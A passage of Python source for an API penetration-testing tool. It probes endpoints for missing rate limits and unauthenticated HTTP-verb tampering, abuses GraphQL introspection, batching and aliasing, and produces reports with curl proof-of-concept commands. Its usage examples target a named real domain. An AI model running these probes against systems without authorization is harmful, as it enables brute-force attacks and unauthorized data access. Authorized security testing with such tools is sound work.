            api_request(ep.url, ep.method, headers=auth_hdrs, timeout=self.timeout)
            for _ in range(BURST)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        statuses = [
            r[0] for r in results
            if not isinstance(r, Exception) and r[0] is not None
        ]

        if not statuses:
            return findings

        got_429 = any(s == 429 for s in statuses)
        if got_429:
            return findings  # Rate limiting is in place

        # Determine severity based on endpoint sensitivity
        sensitive_kws = ["login", "signin", "password", "reset", "otp", "2fa",
                          "mfa", "token", "register", "signup", "auth"]
        is_sensitive = any(kw in ep.path.lower() for kw in sensitive_kws)
        severity = "HIGH" if is_sensitive else "MEDIUM"

        findings.append(APIFinding(
            host=ep.host, url=ep.url, method=ep.method,
            test_type="RATE_LIMIT",
            severity=severity,
            title=f"Rate Limiting Absent on {'Sensitive ' if is_sensitive else ''}Endpoint",
            detail=(
                f"Sending {BURST} identical requests to {ep.url} in rapid succession "
                f"returned statuses {set(statuses)} — no HTTP 429 responses. "
                + ("This is a sensitive authentication endpoint — absence of rate limiting "
                   "enables brute-force attacks against passwords, OTPs, or reset tokens."
                   if is_sensitive else
                   "Rate limiting on API endpoints prevents abuse and DoS attacks.")
            ),
            evidence=(
                f"Sent {BURST} requests, received: {dict((s, statuses.count(s)) for s in set(statuses))}"
            ),
            curl_command=_build_curl(ep.url, ep.method, auth_hdrs),
            recommendation=(
                "Implement rate limiting using a sliding window or token bucket algorithm. "
                "For authentication endpoints: max 5-10 attempts per minute per IP. "
                "Use Redis-backed rate limiting middleware for distributed environments."
            ),
            cvss_estimate=(
                "7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)"
                if is_sensitive else
                "5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)"
            ),
        ))

        return findings

    # ── HTTP VERB TAMPERING ───────────────────────────────────────────────

    async def test_verb_tampering(self, ep: APIEndpoint) -> list[APIFinding]:
        """
        Test whether other HTTP verbs on the same path return different
        access control decisions. A GET endpoint protected by auth might
        respond to POST, PUT, or DELETE without auth.
        """
        findings: list[APIFinding] = []
        auth_hdrs = _auth_headers(self.session_a)

        # Baseline on declared method
        s_base, _, b_base, len_base = await api_request(
            ep.url, ep.method, headers=auth_hdrs, timeout=self.timeout
        )

        alt_methods = [m for m in ["GET","POST","PUT","PATCH","DELETE","OPTIONS"]
                       if m != ep.method.upper()]

        for method in alt_methods[:4]:   # limit to 4 alternates
            s, h, b, blen = await api_request(
                ep.url, method, headers={},   # no auth
                body={} if method in ("POST","PUT","PATCH") else None,
                timeout=self.timeout,
            )
            if s in (200, 201) and blen > 100:
                findings.append(APIFinding(
                    host=ep.host, url=ep.url, method=method,
                    test_type="VERB_TAMPER",
                    severity="MEDIUM",
                    title=f"HTTP Verb Tampering — {method} Returns Data Without Auth",
                    detail=(
                        f"{ep.url} is documented as {ep.method} but sending {method} "
                        f"without any Authorization header returned HTTP {s} with {blen} bytes. "
                        f"The access control check may be method-specific."
                    ),
                    evidence=(
                        f"Baseline: {ep.method} with auth → HTTP {s_base}\n"
                        f"Tampered: {method} without auth → HTTP {s} ({blen}B)"
                    ),
                    curl_command=_build_curl(ep.url, method),
                    recommendation=(
                        "Apply authentication and authorisation checks based on the resource "
                        "path, not the HTTP method. Use a consistent middleware that runs "
                        "before any route handler regardless of verb."
                    ),
                    cvss_estimate="6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
                    response_snippet=b[:400],
                ))
                break

        return findings

    # ── GRAPHQL SPECIFIC ──────────────────────────────────────────────────

    async def test_graphql(
        self, base_url: str, host: str, schema: dict | None
    ) -> list[APIFinding]:
        """
        Test GraphQL-specific vulnerabilities:
        - Introspection enabled (exposes full API surface)
        - Batch query abuse (rate limit bypass)
        - Alias overload (CPU-intensive query)
        - Deep query nesting
        - Field stuffing
        """
        findings: list[APIFinding] = []
        gql_url  = base_url.rstrip("/") + "/graphql"
        auth_hdrs = _auth_headers(self.session_a)

        async def gql_post(query: str) -> tuple[int | None, str, int]:
            s, h, b, blen = await api_request(
                gql_url, "POST",
                headers={**auth_hdrs, "Content-Type": "application/json"},
                body={"query": query},
                timeout=self.timeout,
            )
            return s, b, blen

        # ── Test 1: Introspection ─────────────────────────────────────────
        s, b, blen = await gql_post(GQL_INTROSPECTION)
        if s in (200, 201) and "__schema" in b:
            type_count = b.count('"name"')
            findings.append(APIFinding(
                host=host, url=gql_url, method="POST",
                test_type="GQL_INTROSPECTION",
                severity="MEDIUM",
                title="GraphQL Introspection Enabled in Production",
                detail=(
                    f"GraphQL introspection is enabled at {gql_url}, exposing the complete "
                    f"API schema to unauthenticated users. The schema contains approximately "
                    f"{type_count} type/field definitions. Introspection reveals all queries, "
                    f"mutations, subscriptions, and their argument types — the full attack surface."
                ),
                evidence=f"Query: __schema  Response: HTTP {s} ({blen}B)  Schema types: ~{type_count}",
                curl_command=_build_curl(
                    gql_url, "POST",
                    {**auth_hdrs, "Content-Type": "application/json"},
                    {"query": GQL_INTROSPECTION},
                ),
                recommendation=(
                    "Disable introspection in production environments. "
                    "In Apollo Server: introspection: false (or NODE_ENV !== 'development'). "
                    "In most GraphQL frameworks this is a one-line configuration change."
                ),
                cvss_estimate="5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)",
                response_snippet=b[:300],
            ))

        # ── Test 2: Batch query abuse ─────────────────────────────────────
        # Send 50 queries in one request — each should count as 1 toward rate limits
        batch = [{"query": GQL_TYPENAME}] * 50
        s_b, h_b, b_b, blen_b = await api_request(
            gql_url, "POST",
            headers={**auth_hdrs, "Content-Type": "application/json"},
            body=batch,   # JSON array = batched
            timeout=self.timeout,
        )
        if s_b in (200, 201) and "__typename" in b_b:
            findings.append(APIFinding(
                host=host, url=gql_url, method="POST",
                test_type="GQL_BATCH",
                severity="MEDIUM",
                title="GraphQL Batch Query Abuse — Rate Limit Bypass via Batching",
                detail=(
                    f"The GraphQL endpoint accepts batched requests (JSON array of queries). "
                    f"A single HTTP request containing 50 queries was accepted. "
                    f"This bypasses per-request rate limiting and can be used to "
                    f"brute-force field values or execute large volumes of mutations."
                ),
                evidence=f"Sent array of 50 queries → HTTP {s_b} ({blen_b}B)",
                curl_command=_build_curl(
                    gql_url, "POST",
                    {**auth_hdrs, "Content-Type": "application/json"},
                    batch[:3],
                ),
                recommendation=(
                    "Disable or limit GraphQL query batching. If batching is required, "
                    "enforce a maximum batch size (e.g. 5-10 operations per request). "
                    "Apply rate limiting per operation count, not per HTTP request."
                ),
                cvss_estimate="5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)",
                response_snippet=b_b[:200],
            ))

        # ── Test 3: Alias overload ────────────────────────────────────────
        # 100 aliases of the same field in one query — CPU intensive
        aliases = "\n".join(f"alias{i}: __typename" for i in range(100))
        alias_query = "{ " + aliases + " }"
        s_a, b_a, blen_a = await gql_post(alias_query)
        if s_a in (200, 201) and blen_a > 500:
            findings.append(APIFinding(
                host=host, url=gql_url, method="POST",
                test_type="GQL_ALIAS_OVERLOAD",
                severity="LOW",
                title="GraphQL Alias Overload — No Query Complexity Limit",
                detail=(
                    f"A query with 100 field aliases was accepted and returned "
                    f"HTTP {s_a} with {blen_a} bytes. Without query complexity limits, "
                    f"deeply nested or wide queries can cause CPU/memory exhaustion."
                ),
                evidence=f"100-alias query → HTTP {s_a} ({blen_a}B)",
                curl_command=_build_curl(
                    gql_url, "POST",
                    {**auth_hdrs, "Content-Type": "application/json"},
                    {"query": alias_query[:200]},
                ),
                recommendation=(
                    "Implement query depth limiting and complexity analysis. "
                    "Libraries: graphql-depth-limit, graphql-query-complexity. "
                    "Set max depth to 5-7 and max complexity to 100-200."
                ),
                response_snippet=b_a[:200],
            ))

        return findings


# ═════════════════════════════════════════════════════════════════════════════
# RESPONSE SIMILARITY (for BOLA/IDOR comparison)
# ═════════════════════════════════════════════════════════════════════════════

def _body_similarity(a: str, b: str) -> float:
    """
    Jaccard similarity on token sets.
    Used to compare two API responses — high similarity with different
    session credentials indicates the same object is returned (IDOR).
    """
    tokens_a = set(re.findall(r'\w+', a))
    tokens_b = set(re.findall(r'\w+', b))
    if not tokens_a or not tokens_b:
        return 0.0
    return len(tokens_a & tokens_b) / len(tokens_a | tokens_b)


# ═════════════════════════════════════════════════════════════════════════════
# ORCHESTRATOR
# ═════════════════════════════════════════════════════════════════════════════

class APIFuzzer:
    def __init__(
        self,
        domain: str,
        session_a: str | None = None,
        session_b: str | None = None,
        timeout: float        = 10.0,
        concurrency: int      = 15,
        skip_tests: list[str] | None = None,
    ):
        self.domain      = domain
        self.session_a   = session_a
        self.session_b   = session_b
        self.timeout     = timeout
        self._sem        = asyncio.Semaphore(concurrency)
        self.skip        = set(skip_tests or [])
        self.tester      = APITester(domain, session_a, session_b, timeout)

    async def fuzz_host(
        self,
        host: str,
        ip: str,
        base_url: str,
        extra_endpoints: list[APIEndpoint] | None = None,
    ) -> HostAPIResult:
        result = HostAPIResult(host=host, ip=ip)
        async with self._sem:
            try:
                await self._run(host, ip, base_url, result, extra_endpoints)
            except Exception as exc:
                result.error = str(exc)
                log.warning(f"[{host}] Fuzz error: {exc}")
        return result

    async def _run(
        self,
        host: str,
        ip: str,
        base_url: str,
        result: HostAPIResult,
        extra_endpoints: list[APIEndpoint] | None,
    ) -> None:
        # Discover API endpoints
        endpoints, has_swagger, gql_schema = await discover_api_paths(
            base_url, host, self.session_a, self.timeout
        )
        result.has_swagger = has_swagger
        result.graphql_schema = gql_schema

        # Merge in endpoints from jsreaper
        if extra_endpoints:
            seen_urls = {e.url for e in endpoints}
            for ep in extra_endpoints:
                if ep.url not in seen_urls:
                    endpoints.append(ep)
                    seen_urls.add(ep.url)

        result.endpoints_found = endpoints
        log.info(f"[{host}] Testing {len(endpoints)} endpoints")

        # Run all test modules per endpoint
        test_fns = []
        if "auth" not in self.skip:
            test_fns.append(self.tester.test_auth_bypass)
        if "bola" not in self.skip:
            test_fns.append(self.tester.test_bola)
        if "jwt" not in self.skip:
            test_fns.append(self.tester.test_jwt)
        if "mass_assign" not in self.skip:
            test_fns.append(self.tester.test_mass_assignment)
        if "rate_limit" not in self.skip:
            test_fns.append(self.tester.test_rate_limit)
        if "verb" not in self.skip:
            test_fns.append(self.tester.test_verb_tampering)

        ep_sem = asyncio.Semaphore(8)

        async def test_ep(ep: APIEndpoint) -> list[APIFinding]:
            async with ep_sem:
                all_f: list[APIFinding] = []
                for fn in test_fns:
                    try:
                        f = await fn(ep)
                        all_f.extend(f)
                    except Exception as exc:
                        log.debug(f"[{host}] {fn.__name__} on {ep.path}: {exc}")
                return all_f

        ep_results = await asyncio.gather(
            *[test_ep(ep) for ep in endpoints],
            return_exceptions=True,
        )
        for r in ep_results:
            if isinstance(r, list):
                result.findings.extend(r)

        # GraphQL-specific tests (once per host, not per endpoint)
        if gql_schema and "graphql" not in self.skip:
            try:
                gql_findings = await self.tester.test_graphql(base_url, host, gql_schema)
                result.findings.extend(gql_findings)
            except Exception as exc:
                log.debug(f"[{host}] GraphQL tests: {exc}")

        # Sort findings by severity
        result.findings.sort(key=lambda f: SEVERITY_ORDER.get(f.severity, 9))
        log.info(
            f"[{host}] {len(result.findings)} findings "
            f"({sum(1 for f in result.findings if f.severity in ('CRITICAL','HIGH'))} critical/high)"
        )


# ═════════════════════════════════════════════════════════════════════════════
# INPUT PARSERS
# ═════════════════════════════════════════════════════════════════════════════

def load_from_jsreaper(path: str, domain: str) -> dict[str, list[APIEndpoint]]:
    """
    Load endpoints extracted by jsreaper.py.
    Falls back to host_results[] when endpoints[] is empty (e.g. JS files
    were unreachable but the host list was still recorded).
    Returns dict: host → [APIEndpoint]
    """
    with open(path) as f:
        data = json.load(f)
    by_host: dict[str, list[APIEndpoint]] = {}

    # Primary: load extracted endpoints
    for ep_data in data.get("endpoints", []):
        host = ep_data.get("host", "")
        url  = ep_data.get("endpoint", ep_data.get("url", ""))
        if not host or not url:
            continue
        if not url.startswith("http"):
            continue
        parsed = urlparse(url)
        ep = APIEndpoint(
            url=url, method=ep_data.get("method", "GET"),
            host=host, path=parsed.path,
            params=ep_data.get("params", []),
            source="jsreaper",
        )
        by_host.setdefault(host, []).append(ep)

    # Fallback: if no endpoints were extracted, still collect hosts from
    # host_results[] so apifuzz can run its own discovery pass.
    # This happens when JS files were unreachable or returned no parseable content.
    if not by_host:
        for hr in data.get("host_results", []):
            host = hr.get("host", "")
            if host and host not in by_host:
                by_host[host] = []  # empty list = discovery-only mode
        if by_host:
            log.info(
                f"[Parse] No endpoints in jsreaper output — "                f"found {len(by_host)} hosts for discovery-only mode"
            )
            log.info(
                "[Hint] Re-run jsreaper with the correct --scan file: "                "python3 jsreaper.py --subtakeover scan.json "                "--domain " + domain + " --output js-findings"
            )

    total = sum(len(v) for v in by_host.values())
    log.info(f"[Parse] {total} endpoints across {len(by_host)} hosts from jsreaper output")
    return by_host


def load_from_recon(path: str, domain: str) -> list[tuple[str, str, str]]:
    """
    Load hosts from reconharvest.py output.
    Returns list of (host, ip, base_url).
    """
    with open(path) as f:
        data = json.load(f)
    hosts: list[tuple[str, str, str]] = []
    seen: set[str] = set()
    for hr in data.get("host_reports", []):
        h  = hr.get("host", "")
        ip = hr.get("ip", "")
        if not h or h in seen:
            continue
        ports = hr.get("open_ports", [])
        if not ports:
            continue
        # Prefer HTTPS
        best = next((p for p in ports if p.get("scheme") == "https"), ports[0])
        scheme = best.get("scheme", "http")
        port   = best.get("port", 80)
        if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
            base = f"{scheme}://{h}"
        else:
            base = f"{scheme}://{h}:{port}"
        seen.add(h)
        hosts.append((h, ip, base))
    log.info(f"[Parse] {len(hosts)} hosts from reconharvest output")
    return hosts


def load_from_urlfile(path: str) -> list[tuple[str, str, str]]:
    """Load plain URL list → (host, ip, base_url)."""
    hosts = []
    seen: set[str] = set()
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if not line.startswith("http"):
                line = "https://" + line
            parsed = urlparse(line)
            host   = parsed.netloc
            base   = f"{parsed.scheme}://{host}"
            if host not in seen:
                seen.add(host)
                try:
                    ip = socket.gethostbyname(host.split(":")[0])
                except Exception:
                    ip = host
                hosts.append((host, ip, base))
    log.info(f"[Parse] {len(hosts)} hosts from URL file")
    return hosts


def load_spec(path: str, domain: str) -> list[tuple[str, str, str]]:
    """Load an OpenAPI spec file and return the server host(s)."""
    with open(path) as f:
        spec = json.load(f)
    servers = spec.get("servers", [{"url": f"https://{domain}"}])
    hosts = []
    for srv in servers:
        url = srv.get("url", "")
        if url:
            parsed = urlparse(url if url.startswith("http") else f"https://{domain}")
            host   = parsed.netloc or domain
            base   = f"{parsed.scheme}://{host}"
            hosts.append((host, domain, base))
    return hosts


# ═════════════════════════════════════════════════════════════════════════════
# REPORTING
# ═════════════════════════════════════════════════════════════════════════════

def print_report(report: APIReport) -> None:
    by_sev = {s: [f for f in report.all_findings if f.severity == s]
              for s in SEVERITY_ORDER}

    if not HAS_RICH:
        print(f"\n=== APIFuzz: {report.domain} ===")
        print(f"Hosts: {report.total_hosts}  Endpoints: {report.total_endpoints}  "
              f"Elapsed: {report.elapsed_seconds:.1f}s")
        for f in sorted(report.all_findings, key=lambda x: SEVERITY_ORDER.get(x.severity, 9)):
            print(f"\n[{f.severity}] [{f.test_type}] {f.title}")
            print(f"  {f.url}  — {f.detail[:150]}")
        print()
        return

    border = "red" if by_sev.get("CRITICAL") else "yellow" if by_sev.get("HIGH") else "blue"
    console.print()
    console.print(Panel.fit(
        f"[white]Domain:[/] [cyan]{report.domain}[/]\n"
        f"[white]Scan time:[/] {report.scan_time}\n"
        f"[white]Elapsed:[/] {report.elapsed_seconds:.1f}s\n"
        f"[white]Hosts:[/] {report.total_hosts}    "
        f"[white]Endpoints tested:[/] {report.total_endpoints}\n\n"
        f"[bold red]CRITICAL:[/] {len(by_sev.get('CRITICAL',[]))}    "
        f"[bold yellow]HIGH:[/] {len(by_sev.get('HIGH',[]))}    "
        f"[yellow]MEDIUM:[/] {len(by_sev.get('MEDIUM',[]))}    "
        f"[cyan]LOW:[/] {len(by_sev.get('LOW',[]))}",
        title="[bold]APIFuzz Report[/]",
        border_style=border,
    ))

    # Per-host summary
    console.print("\n[bold cyan]── Host Summary ──[/]")
    htbl = Table(show_header=True, header_style="bold cyan", border_style="dim")
    htbl.add_column("Host",        style="cyan")
    htbl.add_column("Endpoints",   justify="right")
    htbl.add_column("Findings",    justify="right")
    htbl.add_column("Swagger",     justify="center")
    htbl.add_column("GraphQL",     justify="center")
    htbl.add_column("Top Issue",   style="dim", max_width=50)
    for hr in sorted(report.host_results, key=lambda h: -len(h.findings)):
        top = ""
        if hr.findings:
            worst = min(hr.findings, key=lambda f: SEVERITY_ORDER.get(f.severity, 9))
            top = f"[{worst.test_type}] {worst.title[:48]}"
        fc = {}
        for f in hr.findings:
            fc[f.severity] = fc.get(f.severity, 0) + 1
        f_str = " ".join(
            f"[{SEV_COLOR.get(s,'white')}]{s[0]}:{n}[/]"
            for s, n in sorted(fc.items(), key=lambda x: SEVERITY_ORDER.get(x[0], 9))
        ) or "[dim]none[/]"
        htbl.add_row(
            hr.host,
            str(len(hr.endpoints_found)),
            f_str,
            "[green]✓[/]" if hr.has_swagger else "[dim]—[/]",
            "[green]✓[/]" if hr.graphql_schema else "[dim]—[/]",
            top,
        )
    console.print(htbl)

    # Findings detail
    for sev in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"):
        sf = by_sev.get(sev, [])
        if not sf:
            continue
        col = SEV_COLOR.get(sev, "white")
        console.print(f"\n[{col}]── {SEV_EMOJI.get(sev,'')} {sev} ({len(sf)}) ──[/]")
        for i, f in enumerate(sf, 1):
            console.print(
                f"  [{col}][{i}][/] [white]{f.title}[/]\n"
                f"      [dim]Type:[/] {f.test_type}  "
                f"[dim]Host:[/] {f.host}  "
                f"[dim]URL:[/] {f.url}\n"
                f"      [dim]Detail:[/] {f.detail[:200]}{'...' if len(f.detail)>200 else ''}"
            )
            if f.evidence:
                console.print(f"      [dim]Evidence:[/] {escape(f.evidence[:160])}")
            if f.curl_command:
                console.print(f"      [dim]Curl:[/]")
                for line in f.curl_command.split("\n")[:3]:
                    console.print(f"        [dim]{escape(line)}[/]")
            if f.cvss_estimate:
                console.print(f"      [dim]CVSS:[/] {f.cvss_estimate}")
            if i < len(sf):
                console.print()
    console.print()


def save_json(report: APIReport, path: str) -> None:
    data = {
        "domain":          report.domain,
        "scan_time":       report.scan_time,
        "source_file":     report.source_file,
        "total_hosts":     report.total_hosts,
        "total_endpoints": report.total_endpoints,
        "elapsed_seconds": report.elapsed_seconds,
        "summary": {s: len([f for f in report.all_findings if f.severity == s])
                    for s in SEVERITY_ORDER},
        "findings": [asdict(f) for f in sorted(
            report.all_findings,
            key=lambda f: SEVERITY_ORDER.get(f.severity, 9)
        )],
        "host_results": [
            {
                "host":             hr.host,
                "ip":               hr.ip,
                "has_swagger":      hr.has_swagger,
                "has_graphql":      hr.graphql_schema is not None,
                "endpoints_count":  len(hr.endpoints_found),
                "findings":         [asdict(f) for f in hr.findings],
            }
            for hr in report.host_results
        ],
    }
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    log.info(f"JSON report saved → {path}")
    log.info(
        f"  findings[]: {len(report.all_findings)}  "
        f"endpoints tested: {report.total_endpoints}"
    )


def save_html(report: APIReport, path: str) -> None:
    by_sev = {s: [f for f in report.all_findings if f.severity == s]
              for s in SEVERITY_ORDER}
    sc = {"CRITICAL":"#f85149","HIGH":"#d29922","MEDIUM":"#e3b341",
          "LOW":"#58a6ff","INFO":"#8b949e"}
    sb = {"CRITICAL":"rgba(248,81,73,.12)","HIGH":"rgba(210,153,34,.12)",
          "MEDIUM":"rgba(227,179,65,.10)","LOW":"rgba(88,166,255,.10)",
          "INFO":"rgba(139,148,158,.08)"}

    host_rows = ""
    for hr in sorted(report.host_results, key=lambda h: -len(h.findings)):
        fc = {}
        for f in hr.findings:
            fc[f.severity] = fc.get(f.severity, 0) + 1
        badges = " ".join(
            f'<span style="color:{sc.get(s,"#fff")};background:{sb.get(s,"")};'
            f'border:1px solid {sc.get(s,"#444")};padding:1px 6px;border-radius:10px;'
            f'font-size:.72em">{s[0]}:{n}</span>'
            for s, n in sorted(fc.items(), key=lambda x: SEVERITY_ORDER.get(x[0], 9))
        ) or '<span style="color:#3fb950">clean</span>'
        host_rows += (
            f"<tr><td style='color:#58a6ff'>{hr.host}</td>"
            f"<td style='text-align:right'>{len(hr.endpoints_found)}</td>"
            f"<td>{badges}</td>"
            f"<td style='text-align:center;color:#3fb950'>"
            f"{'✓' if hr.has_swagger else ''}</td>"
            f"<td style='text-align:center;color:#3fb950'>"
            f"{'✓' if hr.graphql_schema else ''}</td></tr>"
        )

    findings_html = ""
    for sev in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"):
        sf = by_sev.get(sev, [])
        if not sf:
            continue
        findings_html += (
            f'<div class="sev-section">'
            f'<h3 style="color:{sc[sev]}">{SEV_EMOJI.get(sev,"")} {sev} ({len(sf)})</h3>'
        )
        for i, f in enumerate(sf, 1):
            curl_e = f.curl_command.replace("<","&lt;").replace(">","&gt;")
            findings_html += (
                f'<div class="finding" style="border-left:3px solid {sc[sev]};'
                f'background:{sb[sev]}">'
                f'<div class="ft">[{i}] {f.title}</div>'
                f'<div class="fm">'
                f'<span class="badge" style="color:{sc[sev]};background:{sb[sev]};'
                f'border:1px solid {sc[sev]}">{sev}</span>'
                f'<span style="color:#39c5cf;font-size:.78em;font-weight:700">'
                f'{f.test_type}</span>'
                f'<span style="color:#58a6ff;font-size:.8em">{f.url}</span>'
                + (f'<span style="color:#d29922;font-size:.78em">{f.cvss_estimate}</span>'
                   if f.cvss_estimate else "")
                + f'</div>'
                f'<div class="fd">{f.detail}</div>'
                + (f'<div class="ev"><span class="evl">Evidence:</span>'
                   f'<code>{f.evidence[:250]}</code></div>' if f.evidence else "")
                + (f'<div class="ev"><span class="evl">Reproduce:</span>'
                   f'<pre style="margin:4px 0 0 0;font-size:.8em;color:#a8dadc">'
                   f'{curl_e}</pre></div>' if f.curl_command else "")
                + f'<div class="rec"><span class="recl">Fix:</span> {f.recommendation}</div>'
                + f'</div>'
            )
        findings_html += "</div>"
    if not findings_html:
        findings_html = "<p style='color:#3fb950'>No findings.</p>"

    html = f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>APIFuzz — {report.domain}</title>
<style>
:root{{--bg:#080c10;--sf:#0d1117;--sf2:#111820;--bd:#1e2d3d;--tx:#cdd6e0;--mt:#627384;}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:var(--bg);color:var(--tx);font-family:'Consolas','Monaco',monospace;
     font-size:13px;line-height:1.7}}
body::before{{content:'';position:fixed;inset:0;
  background-image:linear-gradient(rgba(0,212,255,.012) 1px,transparent 1px),
                   linear-gradient(90deg,rgba(0,212,255,.012) 1px,transparent 1px);
  background-size:40px 40px;pointer-events:none;z-index:0}}
.wrap{{max-width:1400px;margin:0 auto;padding:32px 28px 80px;position:relative;z-index:1}}
h1{{font-family:system-ui,sans-serif;font-size:2em;font-weight:800;color:#fff;
   letter-spacing:-.03em;margin-bottom:6px}}
.sub{{color:var(--mt);font-size:.8em;margin-bottom:32px}}
.stats{{display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));
        gap:10px;margin-bottom:28px}}
.stat{{background:var(--sf);border:1px solid var(--bd);border-radius:8px;
       padding:14px;text-align:center}}
.sv{{font-size:1.8em;font-weight:bold}}.sl{{color:var(--mt);font-size:.72em;margin-top:3px}}
.card{{background:var(--sf);border:1px solid var(--bd);border-radius:8px;
       padding:20px;margin-bottom:20px}}
h2{{font-family:system-ui,sans-serif;font-size:1.1em;font-weight:700;color:#fff;
   margin-bottom:14px}}
h3{{font-family:system-ui,sans-serif;font-size:.95em;font-weight:700;margin:16px 0 10px}}
table{{width:100%;border-collapse:collapse}}
th{{background:var(--sf2);color:var(--mt);text-align:left;padding:8px 12px;
   border:1px solid var(--bd);font-size:.72em;text-transform:uppercase;letter-spacing:.07em}}
td{{padding:8px 12px;border-bottom:1px solid var(--bd);vertical-align:top}}
tr:hover td{{background:rgba(88,166,255,.03)}}
.finding{{padding:14px 16px;border-radius:6px;margin-bottom:10px}}
.ft{{font-family:system-ui,sans-serif;font-weight:700;font-size:.9em;color:#fff;
    margin-bottom:8px}}
.fm{{display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-wrap:wrap}}
.badge{{padding:2px 8px;border-radius:10px;font-size:.7em;font-weight:700;letter-spacing:.05em}}
.fd{{color:var(--mt);font-size:.83em;margin-bottom:8px;line-height:1.6}}
.ev{{background:rgba(0,0,0,.4);border:1px solid var(--bd);border-radius:4px;
     padding:8px 10px;margin-bottom:8px}}
.evl{{color:#39c5cf;font-size:.7em;font-weight:700;margin-right:6px}}
.ev code,.ev pre{{color:#a8dadc;font-size:.82em;word-break:break-all}}
.rec{{color:#3fb950;font-size:.8em}}.recl{{font-weight:700;margin-right:4px}}
.sev-section{{margin-bottom:20px}}
.footer{{text-align:center;color:var(--mt);font-size:.72em;margin-top:32px;
         padding-top:16px;border-top:1px solid var(--bd)}}
</style></head>
<body><div class="wrap">
<h1>APIFuzz</h1>
<p class="sub">{report.domain} &nbsp;·&nbsp; {report.scan_time} &nbsp;·&nbsp;
{report.elapsed_seconds:.1f}s &nbsp;·&nbsp; {report.total_hosts} hosts &nbsp;·&nbsp;
{report.total_endpoints} endpoints</p>
<div class="stats">
<div class="stat"><div class="sv" style="color:#f85149">{len(by_sev.get('CRITICAL',[]))}</div><div class="sl">CRITICAL</div></div>
<div class="stat"><div class="sv" style="color:#d29922">{len(by_sev.get('HIGH',[]))}</div><div class="sl">HIGH</div></div>
<div class="stat"><div class="sv" style="color:#e3b341">{len(by_sev.get('MEDIUM',[]))}</div><div class="sl">MEDIUM</div></div>
<div class="stat"><div class="sv" style="color:#58a6ff">{len(by_sev.get('LOW',[]))}</div><div class="sl">LOW</div></div>
<div class="stat"><div class="sv">{report.total_endpoints}</div><div class="sl">ENDPOINTS</div></div>
<div class="stat"><div class="sv">{report.total_hosts}</div><div class="sl">HOSTS</div></div>
</div>
<div class="card"><h2>🖥 Host Summary</h2>
<table><thead><tr><th>Host</th><th>Endpoints</th><th>Findings</th>
<th>Swagger</th><th>GraphQL</th></tr></thead>
<tbody>{host_rows}</tbody></table></div>
<div class="card"><h2>🔎 Findings</h2>{findings_html}</div>
<div class="footer">APIFuzz &nbsp;·&nbsp; For authorized security research only</div>
</div></body></html>"""

    with open(path, "w", encoding="utf-8") as fh:
        fh.write(html)
    log.info(f"HTML report saved → {path}")


# ═════════════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════════════

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="APIFuzz — REST & GraphQL API Security Tester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 apifuzz.py --js js-findings.json --domain eskimi.com --output api
  python3 apifuzz.py --scan recon-report-v2.json --domain eskimi.com --output api
  python3 apifuzz.py --urls endpoints.txt --domain eskimi.com --output api
  python3 apifuzz.py --js js-findings.json --domain eskimi.com \\
      --session-a "Bearer YOUR_TOKEN_A" --session-b "Bearer YOUR_TOKEN_B" -o api
  python3 apifuzz.py --spec openapi.json --domain eskimi.com --output api

Test modules:
  auth          Broken authentication (no auth, stripped tokens, invalid JWT)
  bola          BOLA/IDOR (swap IDs, cross-user access)
  jwt           JWT algorithm confusion (none-alg, role elevation)
  mass_assign   Mass assignment (inject privileged fields)
  rate_limit    Rate limiting absence (burst 20 requests)
  verb          HTTP verb tampering (undeclared methods)
  graphql       GraphQL-specific (introspection, batch abuse, alias overload)

Chains from : jsreaper.py (--js), reconharvest.py (--scan), plain list (--urls), OpenAPI (--spec)
Output      : JSON + HTML report with curl PoC per finding
        """,
    )
    src = p.add_mutually_exclusive_group(required=True)
    src.add_argument("--js",   metavar="FILE", help="jsreaper.py output JSON")
    src.add_argument("--scan", metavar="FILE", help="reconharvest.py output JSON")
    src.add_argument("--urls", metavar="FILE", help="Plain URL list (one per line)")
    src.add_argument("--spec", metavar="FILE", help="OpenAPI/Swagger JSON spec file")

    p.add_argument("--domain",      required=True,  help="Target root domain")
    p.add_argument("-o","--output", metavar="BASE",  help="Output base → BASE.json + BASE.html")
    p.add_argument("--session-a",   metavar="TOKEN",
                   help="Auth token for User A  (e.g. 'Bearer eyJhb...')")
    p.add_argument("--session-b",   metavar="TOKEN",
                   help="Auth token for User B  (required for BOLA confirmation)")
    p.add_argument("--skip",        nargs="+", metavar="MODULE",
                   choices=["auth","bola","jwt","mass_assign","rate_limit","verb","graphql"],
                   default=[],
                   help="Skip specific test modules")
    p.add_argument("--timeout",     type=float, default=10.0,
                   help="HTTP timeout per request (default: 10s)")
    p.add_argument("--concurrency", type=int,   default=15,
                    help="Concurrent host workers (default: 15)")
    p.add_argument("--user-agent",  metavar="UA",
                   help="Override the User-Agent header sent on every request (C18)")
    p.add_argument("-v","--verbose",action="store_true", help="Verbose logging")
    return p.parse_args()


async def main() -> None:
    args = parse_args()
    if args.verbose:
        log.setLevel(logging.DEBUG)
    if args.user_agent:
        set_user_agent(args.user_agent)
        log.info(f"[Config] User-Agent overridden: {args.user_agent[:40]}...")

    print("""
╔══════════════════════════════════════════════════════════════════╗
║           APIFuzz — REST & GraphQL API Security Tester           ║
║  For authorized penetration testing and bug bounty research only ║
